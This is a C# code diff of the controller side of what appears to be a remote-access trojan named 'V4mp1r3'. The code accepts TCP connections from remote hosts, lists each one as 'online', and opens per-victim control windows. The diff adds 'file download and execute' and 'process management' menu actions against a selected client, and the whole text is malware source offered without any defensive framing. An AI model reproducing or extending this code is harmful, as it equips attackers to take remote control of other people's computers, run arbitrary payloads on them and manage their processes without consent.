@@ -51,25 +51,18 @@ namespace V4mp1r3
                 MessageBox.Show("监听设置错误！", "提示");
             }
             listener = new TcpListener(port);
-            try
+            listener.Start();
+            while (true)
             {
-                listener.Start();
-                while (true)
-                {
-                    client = listener.AcceptTcpClient();
-                    string address = client.Client.RemoteEndPoint.ToString();
-                    address = address.Substring(0, address.IndexOf(":"));
-                    id++;
-                    listView1.Items.Add(new ListViewItem(new string[] { id.ToString(), address, "在线" }));
-                    clientlist.Add(id, client);
-                    Thread thread2 = new Thread(new ParameterizedThreadStart(ServerTest));
-                    thread2.Start(id);
-                    MessageBox.Show(address + "上线！", "提示");
-                }
-            }
-            catch
-            {
-                MessageBox.Show("监听设置错误！", "提示");
+                client = listener.AcceptTcpClient();
+                string address = client.Client.RemoteEndPoint.ToString();
+                address = address.Substring(0, address.IndexOf(":"));
+                id++;
+                listView1.Items.Add(new ListViewItem(new string[] { id.ToString(), address, "在线" }));
+                clientlist.Add(id, client);
+                Thread thread2 = new Thread(new ParameterizedThreadStart(ServerTest));
+                thread2.Start(id);
+                MessageBox.Show(address + "上线！", "提示");
             }
         }
         private void ServerTest(object obj)
@@ -162,7 +155,7 @@ namespace V4mp1r3
             }
             catch
             {
-                MessageBox.Show("远程主机已断开连接！");
+                MessageBox.Show("远程主机已断开连接！", "提示");
             }
             listView1.Items[id - 1].SubItems[2].Text = "已断开";
         }
@@ -179,7 +172,7 @@ namespace V4mp1r3
             }
             catch
             {
-                MessageBox.Show("远程主机已断开连接！");
+                MessageBox.Show("远程主机已断开连接！", "提示");
             }
         }
 
@@ -187,6 +180,22 @@ namespace V4mp1r3
         {
             frmAuthor frmAuthor = new frmAuthor();
             frmAuthor.ShowDialog();
+        }
+
+        private void 文件下载执行ToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            int id;
+            id = Int32.Parse(listView1.SelectedItems[0].Text);
+            frmDownloadAndRun frmDownloadAndRun = new frmDownloadAndRun(clientlist[id]);
+            frmDownloadAndRun.ShowDialog();
+        }
+
+        private void 进程管理ToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            int id;
+            id = Int32.Parse(listView1.SelectedItems[0].Text);
+            frmProccessManage frmProccessManage = new frmProccessManage(clientlist[id]);
+            frmProccessManage.ShowDialog();
         }
     }
 }
